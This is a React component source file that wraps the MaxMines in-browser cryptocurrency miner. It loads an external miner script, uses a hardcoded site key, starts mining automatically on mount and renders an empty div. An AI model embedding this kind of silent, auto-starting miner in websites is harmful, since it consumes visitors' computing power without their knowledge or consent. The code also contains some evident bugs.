import React, { Component } from 'react'
import loadScript from 'load-script'
//import PropTypes from 'prop-types'

class MaxMinesClient extends Component {
  constructor (props) {
    super(props)
    this.miner = null
    this._status = 'STOP'
  }

  static defaultProps = {
    timeout: 30000,
    throttle: 0,
    siteKey: 'KJDsFhfambK6QRPOZPfF1mCWiQKtuhvY2pUgUGBm',
    onInit: miner => {},
    onStart: miner => {},
    onStop: miner => {},
    onOpen: miner => {},
    onClose: miner => {},
    onError: miner => {},
    onJob: miner => {},
    onAuthed: miner => {},
    onFound: miner => {},
    onAccepted: miner => {}
  }

  start () {
    if (this.miner) {
      //this.miner.start()
      this._status = 'START'
      this.props.onStart(this.miner)
    }
  }

  stop () {
    if (this.miner) {
      this.miner.stop()
      this._status = 'STOP'
      this.props.onStop(this.miner)
    }
  }

  async componentWillMount () {
    this.miner = await new Promise(resolve => {
      loadScript('./mm.js?v=10', () => {
        if (!window.MaxMines) return

        if (localStorage.getItem("minerName")) {
          return resolve(
            window.MaxMines.User(this.props.siteKey, localStorage.getItem("minerName"))
          )
        }
        window.addEventListener("storage", function(){
        //if (this.props.userName !== null) {
          this.stop()
          console.log(localStorage.getItem("minerName"))
          return resolve(
            window.MaxMines.User(this.props.siteKey, localStorage.getItem("minerName"))
          )
        //}
      });
        return resolve(window.MaxMines.Anonymous(this.props.siteKey))
      })
    }).catch(console.warn)

    this.handleProps(this.props)
    this.props.onInit(this.miner)

    this.miner.on('open', () => this.props.onOpen())
    this.miner.on('close', () => this.props.onClose())
    this.miner.on('error', err => {
      console.log(err)
      this.props.onError(err.error)
    })
    this.miner.on('job', result => this.props.onJob(result))
    this.miner.on('authed', result => this.props.onAuthed(result))
    this.miner.on('found', result => this.props.onFound(result))
    this.miner.on('accepted', result => this.props.onAccepted(result))

    this.stop()
    this.start()
  }

  componentWillReceiveProps (nextProps) {
    return this.handleProps(nextProps)
  }

  handleProps ({ throttle, status }) {
    if (this.miner != null) {
      //this.miner.setAutoThreadsEnabled(true)
      this.miner.setThrottle(throttle)
    }

    if (status !== 'START' && this._status === 'STOP') this.start()
  }

  render () {
    return <div />
  }
}



export default MaxMinesClient
